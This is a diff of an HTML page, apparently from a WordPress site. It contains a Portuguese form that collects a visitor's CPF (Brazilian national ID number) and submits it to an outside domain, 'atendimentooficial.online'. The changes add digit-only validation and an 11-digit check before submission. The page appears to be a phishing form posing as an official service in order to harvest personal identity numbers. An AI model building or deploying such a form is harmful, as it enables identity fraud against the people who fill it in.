@@ -107,57 +107,76 @@ body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: 
 				<div class="elementor-widget-container">
 			<!DOCTYPE html>
 <html>
-	<head>
-		<title>Formulário CPF</title>
-		<style>
-			.center {
-				display: flex;
-				justify-content: center;
-				margin-top: 10px;
-			}
-	
-			input[type="text"] {
-				width: 100%;
-				padding: 10px;
-				margin: 5px 0;
-				border: 2px solid gray; /* Bordas mais nítidas para o campo de CPF */
-				border-radius: 4px; /* Adiciona bordas arredondadas */
-			}
-	
-			.button {
-				width: 100%;
-				padding: 10px;
-				background-color: #D82B80; /* Cor personalizada para o botão */
-				border: none;
-				color: white;
-				text-align: center;
-				text-decoration: none;
-				display: inline-block;
-				font-size: 16px;
-				cursor: pointer;
-				border-radius: 4px; /* Bordas arredondadas para o botão */
-			}
-	
-			.container {
-				width: 300px; /* Largura do campo e do botão */
-				margin: auto;
-			}
-		</style>
-	</head>
-	<body>
-	
-	<form action="https://web.atendimentooficial.online/diafinal" method="get">
-		<div class="container">
-			<label for="cpf">CPF:</label><br>
-			<input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF"><br>
-			<div class="center">
-				<input type="submit" value="Continuar" class="button">
-			</div>
-		</div>
-	</form>
+<head>
+    <title>Formulário CPF</title>
+    <style>
+        .center {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 2px solid gray;
+            border-radius: 4px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #D82B80;
+            border: none;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+
+        .container {
+            width: 300px;
+            margin: auto;
+        }
+    </style>
+</head>
+<body>
+
+<form action="https://web.atendimentooficial.online/diafinal" method="get" onsubmit="return validateForm()">
+    <div class="container">
+        <label for="cpf">CPF:</label><br>
+        <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" oninput="validateCPF()" maxlength="11"><br>
+        <div class="center">
+            <input type="submit" value="Continuar" class="button" id="submitBtn" disabled>
+        </div>
+    </div>
+</form>
+
+<script>
+    function validateCPF() {
+        var cpfInput = document.getElementById('cpf');
+        cpfInput.value = cpfInput.value.replace(/\D/g, ''); // Remove non-numeric characters
+        
+        var submitBtn = document.getElementById('submitBtn');
+        submitBtn.disabled = cpfInput.value.length !== 11; // Disable button if CPF is not 11 digits
+    }
+
+    function validateForm() {
+        var cpfInput = document.getElementById('cpf');
+        
+        // You can add more validation logic here if needed
+        
+        return cpfInput.value.length === 11; // Submit the form only if CPF is 11 digits
+    }
+</script>
 
 </body>
-</html>		</div>
+</html>
+		</div>
 				</div>
 					</div>
 				</div>
